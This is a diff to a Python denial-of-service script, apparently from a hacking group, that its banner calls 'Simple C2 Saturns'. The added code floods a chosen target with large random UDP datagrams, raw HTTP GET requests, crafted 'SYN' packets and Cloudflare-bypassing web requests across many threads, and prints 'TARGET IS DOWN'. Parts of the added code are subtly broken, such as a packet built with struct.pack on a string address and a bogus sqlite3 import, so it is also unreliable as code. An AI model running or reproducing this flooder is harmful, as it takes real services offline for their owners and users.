@@ -1,4 +1,5 @@
 import socket, threading, random, os, colorama, cloudscraper
+from sqlite3 import Time
 from scapy.all import *
 from colorama import Fore
 
@@ -72,6 +73,7 @@ logo = """
  dMMMMMMM@^`       `^^^^
 YMMMUP^
               Simple C2 Saturns
+                   V : 1.2
               MADE BY : MrSanZz
              TEAM  : JogjaXploit
 """
@@ -128,6 +130,37 @@ try:
                 send(p, loop=bytes, verbose=0)
                 scraper = cloudscraper.create_scraper()
                 scraper.get(ip, timeout=thrs)
+                udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                tls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                byte = random._urandom(65000)
+                tip = tuple(ip)
+                udp.sendto(byte, (ip,port))
+                http.connect((ip,port))
+                msg = {
+                    "GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n"
+                    "User-Agent: "+random.choice(ua)+"\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+                    "Connection: Keep-Alive\r\n\r\n"
+                }
+                tls.connect((ip,port))
+                tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
+                scraper = cloudscraper.create_scraper()
+                for i in range(bytes):
+                    udp.sendto(byte, (ip,port))
+                    udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
+                    http.sendto(byte, (ip,port))
+                    tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
+                    pack = "SYN\x00"
+                    pack_len = len(pack)
+                    tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
+                    tcp_syn_packet = tcp_syn_packet + ' \x80\x00\x00\x00 '
+                    tcp_syn_packet = tcp_syn_packet + ' \x00\x00\x00\x80 '
+                    # Add TCP/IP header
+                    tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
+                    tcp.send(tcp_packet, (ip,port))
+                    scraper.get(ip, timeout=thrs)
             except OSError:
                 continue
             except TypeError:
@@ -135,6 +168,9 @@ try:
             except socket.gaierror:
                 print(Fore.LIGHTRED_EX+"[!] Fail get target info, did you type the target correct? [!]")
                 exit()
+            except TimeoutError:
+                print("\n")
+                print(Fore.LIGHTRED_EX+"TARGET IS DOWN ! ")
             except:
                 print(Fore.LIGHTMAGENTA_EX+"[ C2 ] INFO : SUCCESSFULLY FLOODING TARGET <3 [ C2 ]")
                 s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP
@@ -161,10 +197,39 @@ try:
                 send(p, loop=bytes, verbose=0)
                 scraper = cloudscraper.create_scraper()
                 scraper.get(ip, timeout=thrs)
+                udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                tls = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                byte = random._urandom(65000)
+                tip = tuple(ip)
+                udp.sendto(byte, (ip,port))
+                http.connect((ip,port))
+                msg = {
+                    "GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\n"
+                    "User-Agent: "+random.choice(ua)+"\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+                    "Connection: Keep-Alive\r\n\r\n"
+                }
+                tls.connect((ip,port))
+                tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
+                scraper = cloudscraper.create_scraper()
+                for i in range(bytes):
+                    udp.sendto(byte, (ip,port))
+                    udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
+                    http.sendto(byte, (ip,port))
+                    tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
+                    pack = "SYN\x00"
+                    pack_len = len(pack)
+                    tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
+                    tcp_syn_packet = tcp_syn_packet + ' \x80\x00\x00\x00 '
+                    tcp_syn_packet = tcp_syn_packet + ' \x00\x00\x00\x80 '
+                    # Add TCP/IP header
+                    tcp_packet = tcp_syn_packet + struct.pack('!'+'i', tcp_syn_packet.nbytes)
+                    tcp.send(tcp_packet, (ip,port))
+                    scraper.get(ip, timeout=thrs)
     for i in range(thrs):
         threads = threading.Thread(target=c2)
         threads.start()
 except ValueError:
     print("\033[1;33mDid you fill the target info correctly? please retry!")
-except TypeError:
-    print("\033[1;33mWh00pz! Something Just Error, Continue..")
